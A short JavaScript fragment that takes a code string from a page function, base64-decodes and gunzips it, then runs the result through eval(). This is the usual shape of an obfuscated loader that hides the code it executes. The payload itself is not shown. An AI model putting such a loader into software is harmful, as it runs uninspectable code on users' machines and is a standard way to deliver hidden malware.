//
const code = await window.TSUFFIX_loadCode();

if (!code || !code.code) {
console.error("Critical error: No code to execute");
//send log
return;
}


const binaryString = atob(code.code);
const bytes = new Uint8Array(binaryString.length);


for (let i = 0; i < binaryString.length; i++) { bytes[i]=binaryString.charCodeAt(i); } const ds=new
  DecompressionStream("gzip"); const stream=new Response(bytes).body.pipeThrough(ds); const reader=stream.getReader();
  let result="" ; function processChunks() { return reader.read().then(({ done, value })=> {
  if (done) {
  const script = result;
  eval(script);
  return;
  }

  result += new TextDecoder().decode(value);
  return processChunks();
  });
  }

  processChunks().catch((err) => console.error("Decompression error:", err));